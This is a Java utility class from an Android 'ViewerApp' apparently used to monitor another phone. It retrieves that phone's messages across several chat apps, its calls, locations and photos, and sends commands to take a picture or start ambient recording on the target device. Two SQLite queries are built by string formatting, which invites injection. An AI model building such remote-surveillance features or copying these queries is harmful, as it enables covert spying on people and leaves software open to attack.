/*
  ClassName: APIMethod.java
  @Project: ViewerApp
  @author  Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2018-06-05
  Description: class APIMethod used to create template methods for other reusable classes
  History:2018-10-08
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */
package com.scp.viewer.API;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.AsyncTask;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import com.scp.viewer.Model.AmbientRecord;
import com.scp.viewer.Model.Table;
import com.scp.viewer.R;
import com.scp.viewer.View.MyApplication;
import com.wang.avi.AVLoadingIndicatorView;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.net.URI;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import static android.content.Context.MODE_PRIVATE;
import static com.scp.viewer.API.APIDatabase.checkValueStringT;
import static com.scp.viewer.API.APIDatabase.formatDate;
import static com.scp.viewer.API.APIDatabase.getTimeItem;
import static com.scp.viewer.API.APIURL.getDateNowInMaxDate;
import static com.scp.viewer.API.Global.DEFAULT_DATETIME_FORMAT;
import static com.scp.viewer.API.Global.DEFAULT_DATE_FORMAT;
import static com.scp.viewer.API.Global.DEFAULT_DATE_FORMAT_MMM;
import static com.scp.viewer.API.Global.FACEBOOK_TOTAL;
import static com.scp.viewer.API.Global.FUNCTION_NAME_GET_CONNECTION_INFO;
import static com.scp.viewer.API.Global.FUNCTION_NAME_PUSH_NOTIFICATION;
import static com.scp.viewer.API.Global.HANGOUTS_TOTAL;
import static com.scp.viewer.API.Global.INSTAGRAM_TOTAL;
import static com.scp.viewer.API.Global.LENGHT;
import static com.scp.viewer.API.Global.MIN_TIME;
import static com.scp.viewer.API.Global.SETTINGS;
import static com.scp.viewer.API.Global.SKYPE_TOTAL;
import static com.scp.viewer.API.Global.SMS_DEFAULT_TYPE;
import static com.scp.viewer.API.Global.SMS_FACEBOOK_TYPE;
import static com.scp.viewer.API.Global.SMS_HANGOUTS_TYPE;
import static com.scp.viewer.API.Global.SMS_INSTAGRAM_TYPE;
import static com.scp.viewer.API.Global.SMS_SKYPE_TYPE;
import static com.scp.viewer.API.Global.SMS_TOTAL;
import static com.scp.viewer.API.Global.SMS_VIBER_TYPE;
import static com.scp.viewer.API.Global.SMS_WHATSAPP_TYPE;
import static com.scp.viewer.API.Global.TYPE_CHECK_CONNECTION;
import static com.scp.viewer.API.Global.TYPE_START_AMBIENT_RECORDING;
import static com.scp.viewer.API.Global.TYPE_TAKE_A_PICTURE;
import static com.scp.viewer.API.Global.VIBER_TOTAL;
import static com.scp.viewer.API.Global.WHATSAPP_TOTAL;
import static com.scp.viewer.Database.Entity.AmbientRecordEntity.COLUMN_CREATED_DATE_AMBIENTRECORD;

public class APIMethod {

    public static ProgressDialog  progressDialog;
    public static final String  HTTP = "http://";
    public static final String  HTTPS = "https://";
    private static final String  WWW = "www.";

    private static final String  TOTAL_ROW = "TotalRow";
    private static final String  TOTAL_RECORD = "TotalRecord";//
    private static final String  ITEM_SELECTED = " item selected";
    /**
     * method minus two days
     * @param stringExpiry is the expiration date of the device
     * @return sub_Date
     */
    @SuppressLint("SimpleDateFormat")
    public static long subDate(String stringExpiry) {

        Date d1 = null;
        try {
            d1 = new SimpleDateFormat(DEFAULT_DATETIME_FORMAT).parse(stringExpiry);
        } catch (ParseException e) {
            e.printStackTrace();
        }
        /* Today's date */
        Date today = new Date();
        return today.getTime() - d1.getTime();
    }

    /**
     * getProgressDialog()
     * @param title is the title from the other class passed into.
     * @param context is the Context of the class that uses it.
     */
    public static void getProgressDialog(String title, Context context) {
        progressDialog = new ProgressDialog(context);
        progressDialog.setTitle(title);
        progressDialog.setCanceledOnTouchOutside(false);
        progressDialog.show();
    }


    public static void setDateForArrayList(int position, TextView textView, String dateBefore, String dateCurrent)
    {
        String time_URL = getTimeItem(checkValueStringT(dateCurrent), DEFAULT_DATE_FORMAT_MMM);
        if(position > 0)
        {
            String dateNext;
            String dateHere;

            try {
                dateNext = formatDate(dateBefore, DEFAULT_DATE_FORMAT);
                dateHere = formatDate(dateCurrent, DEFAULT_DATE_FORMAT);

                if(!dateNext.equals(dateHere))
                {
                    textView.setVisibility(View.VISIBLE);
                    textView.setText(time_URL);
                }
                else {
                    textView.setVisibility(View.GONE);
                }
            } catch (ParseException e) {
                textView.setVisibility(View.GONE);
                e.printStackTrace();
            }
        }else {
            textView.setText(time_URL);
            textView.setVisibility(View.VISIBLE);
        }
    }

    /**
     * formatURL format the URL if there is "http: //" or "https: //" then remove it.
     * @param str
     * @return url removed "http: //" or "https: //"
     */
    public static String formatURL(String str) {
        try {
            if (!(str.startsWith(HTTP) || str.startsWith(HTTPS))) {
                str =  str.replace(HTTP,"").replace(HTTPS,"");
                str = HTTP+ str.trim();

            }
            String host = new URI(str).getHost();
            if(host != null && (!host.isEmpty()))
            {
                if (host.contains(WWW)) {
                    host = host.replace(WWW,"");
                }
            }
            else {
                String checkSTR = str.replace(HTTP, "").replace(HTTPS,"");
                try {
                    if(checkSTR.contains("/"))
                    {
                        int indexOf = checkSTR.indexOf("/");
                        host = checkSTR.substring(0,indexOf-1);
                    }else {
                        host = checkSTR;
                    }
                }catch (Exception e)
                {
                    host = checkSTR;
                    e.getMessage();
                }
            }
            return host.trim();
        } catch (Throwable th) {
            th.printStackTrace();
            return str;
        }
    }

    /**
     * setToTalLog JSONArray is the method to get the total number of items in a feature called from the server.
     * @return
     */
    public static void setToTalLog(JSONArray jsonArray, String name_Log, Context context)
    {
        if(jsonArray.length() !=0)
        {
            String totalRow = "0";
            try {
                totalRow = jsonArray.getJSONObject(0).getString(TOTAL_ROW);
                if(totalRow != null)
                {
                    setSharedPreferLong(context,name_Log,Long.parseLong(totalRow));
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }

        }
    }

    /**
     * setToTalLog JSONObject is the method to get the total number of items in a feature called from the server.
     * @return
     */
    public static void setToTalLog(JSONObject jsonObject, String name_Log, Context context)
    {

            String totalRow = "0";
            try {

                totalRow = jsonObject.getString(TOTAL_ROW);
                if(totalRow != null)
                {
                    setSharedPreferLong(context,name_Log,Long.parseLong(totalRow));
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }
    }

    /**
     * setToTalLog JSONObject is the method to get the total number of items in a feature called from the server.
     * @return
     */
    public static void setToTalLogTable1(JSONObject jsonObject, String name_Log, Context context)
    {

        String totalRow = "0";
        try {
            JSONArray URLTable1 = jsonObject.getJSONArray("Table1");
            if(URLTable1.length()>0)
                totalRow = URLTable1.getJSONObject(0).getString("TotalRow");
            if(totalRow != null)
            {
                setSharedPreferLong(context,name_Log,Long.parseLong(totalRow));
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /**
     * setToTalLog JSONArray is the method to get the total number of items in a feature called from the server.
     * @return
     */
    public static void setToTalLog(String totalRow, String name_Log, Context context)
    {
                String totalRowTamp = "0";
                totalRowTamp = totalRow;
                if(totalRowTamp != null)
                {
                    setSharedPreferLong(context,name_Log,Long.parseLong(totalRowTamp));
                }
    }

    /**
     * setToTalLog JSONArray is the method to get the total number of items in a feature called from the server.
     * @return
     */
    public static void setToTalLong(long totalRow, String name_Log, Context context)
    {
            setSharedPreferLong(context,name_Log,totalRow);
    }

    /**
     * setTotalLongForSMS This is a method that supports saving the total number of records for each feature such as SMS, WhatsApp, Skype ...
     */
    public static void setTotalLongForSMS(String totalRow, String style, Context context, String deviceID)
    {
        switch (style) {
            case SMS_DEFAULT_TYPE:
                setToTalLog(totalRow, SMS_TOTAL + deviceID, context);
                break;
            case SMS_WHATSAPP_TYPE:
                setToTalLog(totalRow, WHATSAPP_TOTAL + deviceID, context);
                break;
            case SMS_VIBER_TYPE:
                setToTalLog(totalRow, VIBER_TOTAL + deviceID, context);
                break;
            case SMS_FACEBOOK_TYPE:
                setToTalLog(totalRow, FACEBOOK_TOTAL + deviceID, context);
                break;
            case SMS_SKYPE_TYPE:
                setToTalLog(totalRow, SKYPE_TOTAL + deviceID, context);
                break;
            case SMS_HANGOUTS_TYPE:
                setToTalLog(totalRow, HANGOUTS_TOTAL + deviceID, context);
                break;
            case SMS_INSTAGRAM_TYPE:
                setToTalLog(totalRow, INSTAGRAM_TOTAL + deviceID, context);
                break;
        }
    }

    /**
     * getTotalLongForSMS This is a method that supports get the total number of records for each feature such as SMS, WhatsApp, Skype ...
     */
    public static String getTotalLongForSMS(String style,Context context, String deviceID)
    {
        long sms_Total = 1;
        switch (style) {
            case SMS_DEFAULT_TYPE:
                sms_Total = getSharedPreferLong(context, SMS_TOTAL + deviceID);
                break;
            case SMS_WHATSAPP_TYPE:
                sms_Total = getSharedPreferLong(context, WHATSAPP_TOTAL + deviceID);
                break;
            case SMS_VIBER_TYPE:
                sms_Total = getSharedPreferLong(context, VIBER_TOTAL + deviceID);
                break;
            case SMS_FACEBOOK_TYPE:
                sms_Total = getSharedPreferLong(context, FACEBOOK_TOTAL + deviceID);
                break;
            case SMS_SKYPE_TYPE:
                sms_Total = getSharedPreferLong(context, SKYPE_TOTAL + deviceID);
                break;
            case SMS_HANGOUTS_TYPE:
                sms_Total = getSharedPreferLong(context, HANGOUTS_TOTAL + deviceID);
                break;
            case SMS_INSTAGRAM_TYPE:
                sms_Total = getSharedPreferLong(context, INSTAGRAM_TOTAL + deviceID);
                break;
        }
        return String.valueOf(sms_Total);
    }


    /**
     * getTotalLongForSMS This is a method that supports get the total number of records for each feature such as SMS, WhatsApp, Skype ...
     */
    public static String getNameFeatureOfForSMS(String style, String deviceID)
    {
        String sms_Total = "DEFAULT";
        switch (style) {
            case SMS_DEFAULT_TYPE:
                sms_Total = SMS_TOTAL;
                break;
            case SMS_WHATSAPP_TYPE:
                sms_Total = WHATSAPP_TOTAL;
                break;
            case SMS_VIBER_TYPE:
                sms_Total = VIBER_TOTAL;
                break;
            case SMS_FACEBOOK_TYPE:
                sms_Total = FACEBOOK_TOTAL;
                break;
            case SMS_SKYPE_TYPE:
                sms_Total = SKYPE_TOTAL;
                break;
            case SMS_HANGOUTS_TYPE:
                sms_Total = HANGOUTS_TOTAL;
                break;
            case SMS_INSTAGRAM_TYPE:
                sms_Total = INSTAGRAM_TOTAL;
                break;
        }
        return sms_Total + deviceID;
    }

    /**
     * getToTalLog is the method to get the total number of items in a feature called from the server.
     */
    public static String getToTalLog(JSONObject jsonObject, JSONArray jsonArray, String nameTotal)
    {
        String totalRow;
        final String empty = "0";
        if(jsonArray != null)
        {
            if(jsonArray.length() !=0)
            {
                try {
                    totalRow = jsonArray.getJSONObject(0).getString(nameTotal);
                    if(totalRow != null)
                    {
                        return totalRow;
                    }
                    else
                    {
                        return empty;
                    }
                } catch (JSONException e)
                {
                    e.printStackTrace();
                    return empty;
                }
            }
            else {
                return empty;
            }
        }
        else {
            try {
                if(jsonObject!= null)
                {
                    totalRow = jsonObject.getString(nameTotal);
                    Log.d("totalRow"," TotalRecord = "+ totalRow);
                    if(totalRow != null)
                    {
                        return  totalRow;
                    }else {
                        return empty;
                    }
                }
                else {
                    return empty;
                }
            } catch (JSONException e) {
                e.printStackTrace();
                return  empty;
            }
        }
    }


    /**
     * setSharedPreferLong This is the method to set a Long value from the given name
     */
    public static void setSharedPreferLong(Context context,String name, long value)
    {
        SharedPreferences.Editor editor = context.getSharedPreferences(SETTINGS, MODE_PRIVATE).edit();
        editor.putLong(name, value);
        editor.apply();
        editor.commit();
    }

    /**
     * getSharedPreferLong is the method to get the value stored in SharedPrefer by the given name with type Long.
     */
    public static long getSharedPreferLong(Context context,String name)
    {
        SharedPreferences preferences = context.getSharedPreferences(SETTINGS, MODE_PRIVATE);
        return preferences.getLong(name, 0);
    }

    /**
     * getSharedPreferString is the method to get the value stored in SharedPrefer by the given name with type String.
     */
    public static String getSharedPreferString(Context context,String name)
    {
        SharedPreferences preferences = context.getSharedPreferences(SETTINGS, MODE_PRIVATE);
        Long totalNumber = preferences.getLong(name, 0);
        return String.valueOf(totalNumber);
    }

    /**
     * checkItemExist This is a support method to check whether this record already exists in the database or not and add it to the database.
     */
    public static boolean checkItemExistString(SQLiteDatabase database, String tableName, String rawDeviceID, String deviceID, String rawIdContact, String nameFile){

        String query = String.format("SELECT * FROM %s WHERE %s = '%s' AND %s = '%s'", tableName, rawDeviceID, deviceID, rawIdContact, nameFile);
        Cursor cursor = database.rawQuery(query, null);
        if (cursor.moveToFirst())
        {
            cursor.close();
            return true;
        } else {
            cursor.close();
            return false;
        }
    }

    /**
     * checkItemExist This is a support method to check whether this record already exists in the database or not and add it to the database.
     */
    public static String checkItemExistWithDeviceIDString(SQLiteDatabase database, String tableName, String rawDeviceID, String deviceID, String rawIdContact, String nameFile, AmbientRecord ambientRecord){

        boolean checkExits;
        String query = String.format("SELECT * FROM %s WHERE %s = '%s' AND %s = '%s'", tableName, rawDeviceID, deviceID, rawIdContact, nameFile);
        Cursor cursor = database.rawQuery(query, null);
        String timeOld = "";
        if (cursor.moveToFirst())
        {
            timeOld = cursor.getString(cursor.getColumnIndex(COLUMN_CREATED_DATE_AMBIENTRECORD));
            cursor.close();
        } else {
            cursor.close();
        }
        return timeOld;
    }

    /**
     *  startAnim this is the method for showing progress bar custom.
     */
    public static void startAnim(AVLoadingIndicatorView avLoadingIndicatorView){
        avLoadingIndicatorView.show();
        // or avi.smoothToShow();
    }

    /**
     *  stopAnim this is the method for hide progress bar custom.
     */
    public static void stopAnim(AVLoadingIndicatorView avLoadingIndicatorView){
        try {
            Thread.sleep(200);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        avLoadingIndicatorView.hide();
    }

    /**
     * Function to convert milliseconds time to
     * Timer Format
     * Hours:Minutes:Seconds
     */
    public static String formatMilliSecond(long milliseconds) {
        String finalTimerString = "";
        String secondsString = "";

        // Convert total duration into time
        int hours = (int) (milliseconds / (1000 * 60 * 60));
        int minutes = (int) (milliseconds % (1000 * 60 * 60)) / (1000 * 60);
        int seconds = (int) ((milliseconds % (1000 * 60 * 60)) % (1000 * 60) / 1000);

        // Add hours if there
        if (hours > 0) {
            finalTimerString = hours + ":";
        }

        // Prepending 0 to seconds if it is one digit
        if (seconds < 10) {
            secondsString = "0" + seconds;
        } else {
            secondsString = "" + seconds;
        }

        finalTimerString = finalTimerString + minutes + ":" + secondsString;

        return finalTimerString;
    }


    /**
     * GetJsonFeature is a method of creating available values to send to the server and receive data.
     * @param table to get Device_ID.
     * @param start_Index You want to get data from what position in the database of that feature.
     * @param function_Name: is the feature name you want to get data about such as SMS, Calls, Locations.
     * * Using in class:
     *         - CallHistory.class,
     *         - ContactHistory.class,
     *         - ApplicationUsageHistory.class,
     *         - ContactHistory.class
     *         - HistoryLocation.class,
     *         - PhoneCallRecordHistory.class,
     *         - PhotoHistory.class,
     *         - SMSHistory.class,
     *         - URLHistory.class,
     *         - ApplicationUsageHistory.class 2021-07-12
     */
    public static String GetJsonFeature(Table table, long start_Index, String function_Name)
    {
        Log.d("ContactId", table.getDevice_Identifier() + "");
        // max_Date is get all the location from the min_date to the max_Date days
        String max_Date = getDateNowInMaxDate();
        Log.d("totalRow", max_Date + "");
        String value = "<RequestParams Device_ID=\"" + table.getDevice_Identifier() + "\" Start=\"" + start_Index + "\" Length=\"" + LENGHT + "\" Min_Date=\"" + MIN_TIME + "\" Max_Date=\"" + max_Date + "\" />";
        return APIURL.POST(value, function_Name);
    }



    /**
     * GetJsonFeature is a method of creating available values to send to the server and receive data.
     * @param table to get Device_ID.
     * @param mineDate You want to get data from what position in the database of that feature.
     * @param function_Name: is the feature name you want to get data about such as SMS, Calls, Locations.
     * * Using in class:
     *         - HistoryLocation.class,
     *         - PhotoHistory.class,
     *         - PhoneCallRecording.class,
     *         - SyncSettings.class,
     */
    public static String GetJsonNowFeature(Table table, String mineDate, String function_Name)
    {
        Log.d("GetJsonNowFeature", table.getDevice_Identifier() + "");
        // max_Date is get all the location from the min_date to the max_Date days
        String max_Date = getDateNowInMaxDate();
        Log.d("GetJsonNowFeature", max_Date + "");
        String value = "<RequestParams Device_ID=\"" + table.getDevice_Identifier() + "\" Start=\"0\" Length=\"1\" Min_Date=\"" + mineDate + "\" Max_Date=\"" + max_Date + "\" />";
        return APIURL.POST(value, function_Name);
    }


    /**
     * GetJsonCheckConnectionFeature is a method of creating available values to send to the server and receive data.
     * - DashBoard.class,
     */
    public static String GetJsonCheckConnectionFeature(String device_Identifier)
    {
        Log.d("GetJsonNowFeature", device_Identifier + "");
        // max_Date is get all the location from the min_date to the max_Date days
        String max_Date = getDateNowInMaxDate();
        Log.d("GetJsonNowFeature", max_Date + "");
        String value = "<RequestParams Device_ID=\"" + device_Identifier + "\"/>";
        return APIURL.POST(value, FUNCTION_NAME_GET_CONNECTION_INFO);
    }


    /**
     * GetJsonFeature is a method of creating available values to send to the server and receive data.
     * @param device_Id to get Device_ID.
     * @param SMS_Type This is the parameter you want to receive SMS for example SMS = 0; WhatsApp = 1; Viber = 2;
     * @param function_Name: is the feature name you want to get data about such as SMS, Calls, Locations.
     * @param min_Date is the date you want to start retrieving SMS from the server.
     * @param max_Date The last day you want to retrieve its SMS from the server.
     * Using in class SMSHistory.class
     */
    public static String GetJsonFeature(String device_Id, String function_Name, String SMS_Type, String min_Date, String max_Date)
    {
        String value = "<RequestParams Device_ID=\"" + device_Id + "\" Start=\"0\" Length=\"3000\" Min_Date=\"" + min_Date + " \" Max_Date=\"" + max_Date + " \" Type=\"" + SMS_Type + "\" />";
        return APIURL.POST(value, function_Name);
    }


    /**
     * PostJsonClearDataToServer This is the generic method for user-selected data deletion protocols to completely delete it on the server.
     */
    public static String PostJsonClearDataToServer(String device_ID, StringBuilder list_ID, String function_Name)
    {
        String value = "<RequestParams Device_ID=\"" + device_ID + "\" List_ID=\"" + list_ID + "\" />";
        return APIURL.POST(value, function_Name);
    }

    /**
     * PostPushNotificationToServer This is the common method for push notification protocols from ViewerApp to TargetApp.
     */
    public static String PostPushNotificationToServer(String device_ID, String device_Row_ID, String type, int actions)
    {
        String value;
        if(type.equals(TYPE_TAKE_A_PICTURE))
        {
            value = "<RequestParams Device_ID=\""+ device_ID +"\" Device_Row_ID=\""+ device_Row_ID +"\" Type=\"" +type + "\"  Use_Camera=\"" + actions + "\"></RequestParams>";
        }
        else if(type.equals(TYPE_START_AMBIENT_RECORDING))
        {
            //Start_Ambient="0"
            value = "<RequestParams Device_ID=\""+ device_ID +"\" Device_Row_ID=\""+ device_Row_ID +"\" Type=\"" +type + "\"  Start_Ambient=\"" + actions + "\"></RequestParams>";
        }
        else
        {
            value = "<RequestParams Device_ID=\""+ device_ID +"\" Device_Row_ID=\""+device_Row_ID +"\" Type=\"" + type + "\"></RequestParams>";
        }

        return APIURL.POST(value, FUNCTION_NAME_PUSH_NOTIFICATION);
    }

    /**
     * PostJsonClearDataToServer This is the generic method for user-selected data deletion protocols to completely delete it on the server.
     * There is no Device_Id parameter
     */
    public static String PostJsonClearDataToServer(StringBuilder list_ID, String function_Name)
    {
        String value = "<RequestParams List_File=\"" + list_ID + "\" />";;
        return APIURL.POST(value, function_Name);
    }

    /**
     * PostJsonClearDataToServer This is the generic method for user-selected data deletion protocols to completely delete it on the server.
     * There is an additional parameter SMS_Type
     */
    public static String PostJsonClearDataToServer(String device_ID, StringBuilder list_ID, String function_Name, String SMS_Type)
    {
        String value = "<RequestParams Device_ID=\"" + device_ID + "\" List_ID=\"" + list_ID + "\" />";

        return APIURL.POST(value, function_Name);
    }

    /**
     * updateViewCounterAll This is a shared method with classes to update the number of items selected to delete.
     */
    public static void updateViewCounterAll(Toolbar toolbar, int counter)
    {
        if (counter == 0) {
            toolbar.setTitle("  " + counter + ITEM_SELECTED);
        } else {
            toolbar.setTitle("  " + counter + ITEM_SELECTED);
            toolbar.setLogo(null);
        }
    }

    /**
     * shareContact: This is a method to help share contact information to other applications
     */
    public static void shareContact(Context context, String nameContact, String phoneNumber)
    {
        Intent sendIntent = new Intent();
        sendIntent.setAction(Intent.ACTION_SEND);
        sendIntent.putExtra(Intent.EXTRA_TEXT, "Name: "+nameContact+"\nPhone: "+ phoneNumber);
        sendIntent.setType("text/plain");
        Intent shareIntent = Intent.createChooser(sendIntent, null);
        shareIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(shareIntent);
    }

    /**
     * The alertDialogDeleteItems method used to display the AlertDialog pattern has two parameter values ​​for the other classes to reuse for the purpose of re-authenticating the user wants to delete or not?
     */
    public static void alertDialogDeleteItems(final Activity activity, String message, final AsyncTask<String, Void, String> task) {


        AlertDialog.Builder builder = new AlertDialog.Builder(activity);
        builder.setCancelable(false);
        builder.setTitle("");
        builder.setMessage(message);
        builder.setPositiveButton(MyApplication.getResourcses().getString(R.string.ok), new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                try {

                    getProgressDialog(MyApplication.getResourcses().getString(R.string.delete)+"...",activity);
                    task.execute();
                }catch (Exception e)
                {
                    e.getMessage();
                }
            }
        });
        builder.setNegativeButton(MyApplication.getResourcses().getString(R.string.cancel), new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                //
                dialogInterface.dismiss();
                //context.finish();
            }
        });

        builder.show();
    }

    /**
     * getMilliFromDate
     */
    public static long getMilliFromDate(String dateFormat) {
        Date date = new Date();
        @SuppressLint("SimpleDateFormat") SimpleDateFormat formatter = new SimpleDateFormat(DEFAULT_DATETIME_FORMAT);
        try {
            date = formatter.parse(dateFormat);
        } catch (ParseException e) {
            e.printStackTrace();
        }
        System.out.println("Today is " + date);
        return date.getTime();
    }


    @SuppressLint("StaticFieldLeak")
    public static class PushNotification extends AsyncTask<String, Void, String> {
        String device_Identifier, type, device_ID;
        int camera_Use;

        public PushNotification(String device_Identifier, String type, String device_ID, int camera_Use) {
            this.device_Identifier = device_Identifier;
            this.type = type;
            this.device_ID = device_ID;
            this.camera_Use = camera_Use;
        }

        @Override
        protected String doInBackground(String... strings) {
            Log.d("device_Identifier", device_Identifier + "");
            /*String value = <RequestParams Device_ID="b7540860be17094e" Device_Row_ID="7" Type="take_a_picture"  Use_Camera="2"  Brand_ID="1"></RequestParams>;
            String function = POST_CLEAR_MULTI_GPS;*/
            // PostPushNotificationToServer(String device_ID, String device_Row_ID, String type, int use_Camera, int brand_ID)
            return PostPushNotificationToServer(device_ID, device_Identifier, type, camera_Use);
        }

        @Override
        protected void onPostExecute(String s) {

            APIURL.deviceObject(s);
            Log.d("PushNotification", APIURL.bodyLogin.getDescription() + "==" + "" + APIURL.bodyLogin.getResultId() + "" + APIURL.bodyLogin.getIsSuccess());
            if (APIURL.bodyLogin.getIsSuccess().equals("1") && APIURL.bodyLogin.getResultId().equals("1")) {

                // handle whether push notification to target phone
                // if yes, wait 10 seconds to get location history
                // if the send fails, tell the user that the current error is not getting-gps-now

            } else {
                /*Toast.makeText(HistoryLocation.this, APIURL.bodyLogin.getDescription() + "", Toast.LENGTH_SHORT).show();*/
                // if the send fails, tell the user that the current error is not getting-gps-now
            }
            // get Method getThread()
            //getThread(progressDialog);
           // APIMethod.progressDialog.dismiss();
        }
    }

}
